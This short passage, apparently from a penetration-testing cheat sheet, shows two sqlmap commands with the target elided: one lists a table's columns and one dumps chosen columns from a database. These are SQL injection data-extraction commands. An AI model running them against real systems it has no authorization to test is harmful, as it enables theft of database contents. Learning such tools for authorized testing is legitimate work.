sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
